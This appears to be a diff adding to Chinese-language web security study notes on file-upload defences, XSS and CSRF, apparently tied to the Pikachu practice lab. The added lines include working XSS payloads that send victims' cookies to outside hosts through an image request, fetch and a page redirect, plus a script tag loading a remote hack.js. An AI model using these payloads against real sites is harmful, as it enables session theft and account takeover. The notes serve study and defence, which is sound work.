@@ -168,3 +168,30 @@ Content-Type:文件MIME,视情况更改
 在 URL 编码中，%00 表示 NULL 字符（ASCII 码为0）。NULL 字符通常用于表示字符串的结束，在某些情况下也可以用作字符串的分隔符。
 重复数据-防匹配（参数多次）
 本地fuzz大法测试 网上找fuzz字典
+
+#文件上传安全修复方案
+后端验证：采用服务端验证模式
+后毁检测：基于黑名单，白名单过滤
+MTME检测：基于上传自带类型检测
+内容检测：文件头，完整性检测
+自带函数过滤：参考upload1abs函数
+自定义函数过滤：function check file（）{}
+WA防护产品：宝塔，云盾，安全公司产品等
+
+XSS跨站脚本Cross-Site Scripting
+<script>document.write('<img src="http://192.168.5.52:8888?x='+document.cookie +'" width=0 height=0 >')</script >
+<script>alert(document.cookie)</script>
+<script>fetch('http://192.168.5.52:8888?x=' + document.cookie);</script>
+
+CSRF与XSS的区别：CSRF是借用户的权限完成攻击，攻击者并没有拿到用户的权限，而XSS是直接盗取到了用户的权限，然后实施破坏。
+XSS只能获取到有漏洞网站的受害者cookie，仅限于此网站
+CSRF则可以诱导受害者在多个网站操作
+
+<script>document.location = 'http://92.168.99.131/Pikachu-master/pkxss/xcookie/cookie.php?cookie=' + document.cookie;</script>
+
+<script src='http://39.96.44.170/hack.js'></script>
+
+XSS工具：beef、github_XSS-payload
+
+HttpOnly
+如果您在cookie中设置了HttpOnly属性，那么通过js脚本将无法读取到cookiet信息，这样能有效的防止SS攻击
